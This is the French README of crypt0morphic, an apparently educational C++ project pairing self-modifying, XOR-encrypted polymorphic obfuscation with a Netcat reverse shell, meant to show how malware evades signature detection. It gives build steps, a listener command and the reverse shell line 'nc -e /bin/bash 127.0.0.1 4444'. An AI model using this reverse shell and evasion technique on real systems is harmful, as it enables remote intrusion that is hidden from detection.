# 🔥 crypt0morphic 🔥

> "L'obfuscation, c'est l'art de cacher l'évidence... et de rendre la vie difficile aux curieux !" 🕵️‍♂️💻

## 🛠️ Qu'est-ce que crypt0morphic ?
crypt0morphic est un projet **pédagogique** en C++ qui explore les techniques d'**obfuscation polymorphe** appliquées à un **reverse shell**. Son but ?

✅ Modifier son propre code source à l'exécution 📜🔄  
✅ Réordonner les blocs de fonctions de manière dynamique 🎲  
✅ Chiffrer partiellement le code via **XOR** 🔐  
✅ Lancer un **reverse shell** avec **Netcat** 🌐💀  

---
## 📌 Table des Matières
1. [Présentation](#-présentation)
2. [Fonctionnalités](#-fonctionnalités)
3. [Architecture du Projet](#-architecture-du-projet)
4. [Installation et Dépendances](#-installation-et-dépendances)
5. [Compilation et Exécution](#-compilation-et-exécution)
6. [Script d'Automatisation](#-script-dautomatisation)
7. [Tests Unitaires](#-tests-unitaires)
8. [Mécanismes Internes](#-mécanismes-internes)
9. [Restauration du Code Source](#-restauration-du-code-source)
10. [Remarques et Sécurité](#-remarques-et-sécurité)
11. [Licence](#-licence)

---
## 🎯 Présentation
L'objectif de crypt0morphic est de **démontrer comment un programme peut s'auto-obfusquer** en modifiant son propre fichier source **sans altérer ses fonctionnalités**. Il s'inspire des méthodes employées par certains malwares pour échapper aux détections par signature 🦠🚨.

## ⚡ Fonctionnalités
- **Auto-obfuscation** : Le programme modifie son propre fichier source 📜✂️.
- **Réordonnancement des fonctions** : Détection des blocs via `// BEGIN_FUNCTION` & `// END_FUNCTION` et réorganisation aléatoire 🔄.
- **Chiffrement XOR** : Certaines parties du code sont chiffrées avec une clé fixe 🔐.
- **Reverse Shell** : Utilisation de **Netcat** pour obtenir un accès distant 💀.
- **Sauvegarde et restauration** : Possibilité de revenir à la version originale en cas d'erreur 🛡️.

## 🏗️ Architecture du Projet
📂 **Organisation du projet** :
```
.
├── README.md
├── scripts
│   └── build_ofuscate.sh
├── src
│   ├── main.cpp
│   ├── obfuscator
│   │   ├── obfuscator.cpp
│   │   └── obfuscator.h
│   └── reverse_shell
│       ├── reverse_shell.cpp
│       └── reverse_shell.h
└── tests
    ├── builds
    │   ├── test_obfuscator
    │   └── test_reverse_shell
    ├── test_obfuscator.cpp
    └── test_ReverseShell.cpp
```

## 📥 Installation et Dépendances
**Prérequis :**
- 💻 **OS** : Ubuntu 24+ ou distribution Linux compatible 🐧.
- 🏗️ **Compilateur** : g++ (C++17+).
- 🔗 **Netcat** : Installation via :
  ```bash
  sudo apt-get install netcat-traditional
  sudo update-alternatives --config nc
  ```

## ⚙️ Compilation et Exécution
**Compilation automatique :**
```bash
./scripts/build_ofuscate.sh
```
**Compilation manuelle :**
```bash
g++ -std=c++17 -I./src -o crypt0morphic src/main.cpp src/obfuscator/obfuscator.cpp src/reverse_shell/reverse_shell.cpp
```
**Lancement du listener (dans un autre terminal) :**
```bash
nc -l -p 4444
```
**Exécution du programme :**
```bash
./crypt0morphic
```

## 🤖 Script d'Automatisation
Le script `build_ofuscate.sh` permet de :
✅ Nettoyer les anciens builds 🗑️  
✅ Compiler l'application 🏗️  
✅ Exécuter les tests unitaires 🔬  
✅ Lancer `crypt0morphic` 🚀  

## 🧪 Tests Unitaires
Les tests unitaires se trouvent dans `tests/` et couvrent :
- **ReverseShell** : Teste la génération de commande et l'exécution 🕵️.
- **Obfuscator** : Valide la sauvegarde, le réordonnancement et le chiffrement 🔄🔐.

Compilation et exécution des tests :
```bash
g++ -std=c++17 -I./src -o tests/builds/test_reverse_shell src/reverse_shell/reverse_shell.cpp tests/test_ReverseShell.cpp
./tests/builds/test_reverse_shell

g++ -std=c++17 -I./src -o tests/builds/test_obfuscator src/obfuscator/obfuscator.cpp tests/test_obfuscator.cpp
./tests/builds/test_obfuscator
```

## 🏴‍☠️ Mécanismes Internes
**Obfuscation :**
- Sauvegarde initiale du fichier `.bak`
- Extraction des blocs de fonctions (`// BEGIN_FUNCTION`, `// END_FUNCTION`)
- Réorganisation aléatoire 🎲
- Chiffrement XOR 🔐

**Reverse Shell :**
```bash
nc -e /bin/bash 127.0.0.1 4444
```

## 🔄 Restauration du Code Source
En cas de souci, vous pouvez restaurer le fichier d'origine avec `restoreBackup()`.
```bash
cp src/main.cpp.bak src/main.cpp
```

## ⚠️ Remarques et Sécurité
⚠️ **Usage éducatif uniquement** : Ce projet est destiné à l'apprentissage et non à une utilisation malveillante 🚨.
⚠️ **Tests dans un environnement isolé** : Ne pas exécuter sur une machine de production ⚔️.

## 📝 Licence
🚀 **Projet libre et pédagogique** : Modifiez et utilisez ce projet pour apprendre, mais respectez les lois en vigueur 📜✨.
